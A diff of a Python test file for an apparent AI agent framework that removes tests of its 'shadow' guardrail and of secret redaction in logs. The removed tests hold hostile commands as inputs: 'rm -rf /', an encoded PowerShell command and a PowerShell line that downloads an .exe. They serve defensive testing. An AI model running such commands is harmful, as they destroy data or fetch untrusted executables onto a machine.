@@ -17,7 +17,6 @@ from remedy.core.metabolism.identity_export import (
     import_identity,
 )
 from remedy.core.metabolism.machine_map import get_machine_map, reset_machine_map
-from remedy.core.metabolism.shadow import rehearse, should_shadow
 from remedy.core.metabolism.tier import TurnTier, classify_turn_tier, tier_policy
 from remedy.core.metabolism.time_crystal import get_time_crystal, reset_time_crystal
 from remedy.core.metabolism.turn import (
@@ -648,59 +647,6 @@ def test_machine_map_ttl_and_hint():
     assert "work_roots=" in hint
 
 
-def test_shadow_blocks_destructive_shell():
-    assert should_shadow("bash_exec", tier=2)
-    r = rehearse("bash_exec", {"command": "rm -rf /"}, tier=2)
-    assert r.blocked
-    r2 = rehearse("bash_exec", {"command": "echo hi"}, tier=2)
-    assert r2.outcome == "pass"
-    assert not should_shadow("bash_exec", tier=0)
-
-
-def test_shadow_blocks_path_outside_roots(tmp_path: Path):
-    root = tmp_path / "proj"
-    root.mkdir()
-    r = rehearse(
-        "file_write",
-        {"path": str(tmp_path / "other" / "x.txt"), "content": "nope"},
-        tier=2,
-        work_roots=[str(root)],
-    )
-    assert r.blocked
-
-
-def test_shadow_blocks_all_batch_paths(tmp_path: Path):
-    root = tmp_path / "proj"
-    root.mkdir()
-    good = root / "a.txt"
-    bad = tmp_path / "outside" / "b.txt"
-    r = rehearse(
-        "file_edit_batch",
-        {
-            "edits": [
-                {"path": str(good), "old_string": "a", "new_string": "b"},
-                {"path": str(bad), "old_string": "a", "new_string": "b"},
-            ]
-        },
-        tier=2,
-        work_roots=[str(root)],
-    )
-    assert r.blocked
-
-
-def test_shadow_allows_relative_path_under_work_root(tmp_path: Path):
-    root = tmp_path / "proj"
-    root.mkdir()
-    r = rehearse(
-        "file_write",
-        {"path": "notes.txt", "content": "hello"},
-        tier=2,
-        work_roots=[str(root)],
-    )
-    assert not r.blocked
-    assert r.outcome == "pass"
-
-
 def test_action_ir_redacts_and_persists(tmp_path: Path):
     ir = start_action_ir(session_id="test_meta_sess", tier=2, brief_head="fix bug")
     ir.add_step(
@@ -1193,28 +1139,6 @@ def test_evidence_persist_index_delta_only(tmp_path: Path):
     assert len(lines3) > n1
 
 
-def test_log_formatter_redacts_secrets():
-    """Structured and text log formatters must not emit raw secret material."""
-    import logging
-
-    from remedy.core.logging import StructuredFormatter, TextFormatter
-
-    rec = logging.LogRecord(
-        name="remedy.test",
-        level=logging.INFO,
-        pathname=__file__,
-        lineno=1,
-        msg="login api_key=sk-abcdefghijklmnopqrstuvwxyz0123 token=x",
-        args=(),
-        exc_info=None,
-    )
-    js = StructuredFormatter(color=False).format(rec)
-    assert "sk-abcdefghijklmnopqrstuvwxyz0123" not in js
-    assert "[redacted]" in js or "api_key" in js
-    txt = TextFormatter().format(rec)
-    assert "sk-abcdefghijklmnopqrstuvwxyz0123" not in txt
-
-
 def test_evidence_delta_before_mark_model_call():
     """pointer_block must be non-empty before mark; empty after (order matters)."""
     from remedy.core.metabolism.evidence import get_evidence_ledger, reset_evidence_ledger
@@ -1348,24 +1272,6 @@ def test_action_ir_strips_url_userinfo_via_start_helper():
     assert "s3cret" not in blob
     assert "tok=abc" not in blob
     assert "example.com" in blob
-
-
-def test_shadow_blocks_opaque_payload_shell():
-    r = rehearse(
-        "bash_exec",
-        {"command": "powershell -EncodedCommand SQBFAFgA"},
-        tier=2,
-        work_roots=[r"C:\proj"],
-    )
-    assert r.blocked
-    assert r.outcome == "hard_block"
-    r2 = rehearse(
-        "bash_exec",
-        {"command": "(New-Object Net.WebClient).DownloadFile('http://x','a.exe')"},
-        tier=2,
-        work_roots=[r"C:\proj"],
-    )
-    assert r2.blocked
 
 
 def test_machine_map_scrubs_url_userinfo():
